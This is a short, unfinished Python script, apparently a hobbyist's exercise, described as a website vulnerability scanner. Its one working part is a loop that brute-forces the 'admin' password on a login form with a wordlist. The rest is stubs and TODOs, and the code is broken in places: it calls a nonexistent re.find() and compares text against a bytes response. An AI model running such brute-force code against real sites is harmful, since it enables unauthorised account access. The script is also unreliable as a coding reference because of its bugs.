'''
    author  : zerobits01
    created : 27-Jan-2020
    purpose : analysing a website for vulns
'''

# we use the crawler that we programmed before and we use
#  our knowledge and programming to automate the process of discovering vulns

import requests
import re
import argparse

'''
    we use the text box's and and params in urls
    to inject some code we should use this app against sites
    that run in SQL so first step is gathering some basic info about that site
'''
parser = argparse.ArgumentParser(description='''
    author : zerobits01
    purpose: vulnerability scanner and brute force
    gmail  : zerobits0101@gmail.com
    team   : Paradox-Squad
''',formatter_class=argparse.RawTextHelpFormatter)

# we can use args too
parser.add_argument('-b','--brute-foce',dest='brute_force',
                        action='store_true',default=False,
                            help='use this switch for bruteforcing a url')
parser.add_argument('-u','--url',
                        help='enter the url for scan or brute force',
                            type=str, required=True)
parser.add_argument('-s','--scan',help='use this switch for scanning the url')

parser.add_argument('-e','--enter',help='enter the program')
# args = parser.parse_args()

target_url = ''
data_dict = {"username":"admin","password":"","Login":"submit"}
passwd_path = ''


# we can also use a word list for username too or entering it manually
def brute_force():
    global passwd_path
    global data_dict
    with open(passwd_path, "r") as wordlist_file:
        i = 1
        for line in wordlist_file:
            print(i)
            word = line.strip()
            data_dict["password"] = word
            response = requests.post(target_url, data=data_dict)
            i = i+1
            if "Login failed" not in response.content:
                print ("[+] Got the Password ----> " + word)
                return
        print("[!] Didn't found.")


while True:
    cmnd = input('>').strip()
    cmnd = cmnd.lower()

    if cmnd.startswith('set'):
        # TODO : check the option with re and try to evaluate
        pass
    elif cmnd.startswith('start'):
        # TODO : check which app to start
        if re.find():
            brute_force()
    elif cmnd == 'help':
        # TODO : print the usability and options
        pass
    else:
        print('[!] command not found')